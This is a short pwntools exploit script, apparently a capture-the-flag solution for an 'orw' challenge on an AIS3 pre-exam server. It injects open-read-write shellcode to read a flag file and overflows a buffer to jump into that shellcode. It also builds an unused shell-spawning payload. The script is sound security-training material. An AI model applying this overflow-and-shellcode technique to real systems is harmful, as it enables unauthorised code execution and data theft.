from pwn import *


context(arch = 'amd64')
#p = process('./orw')
p = remote('pre-exam-pwn.ais3.org', 10001)

offset = 'a' * 40
buf2_addr = 0x6010a0
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(0x100, 'A')
#raw_input()


shellcode = ''
shellcode += shellcraft.pushstr('/home/orw/flag')
shellcode += shellcraft.open('rsp', 0, 0)
shellcode += shellcraft.read('rax', 'rsp', 50)
shellcode += shellcraft.write(1, 'rsp', 50)
sh = asm(shellcode)





p.send(sh)
print p.recvuntil('do :)\n')
payload = offset + p64(buf2_addr)
p.sendline(payload)

p.interactive()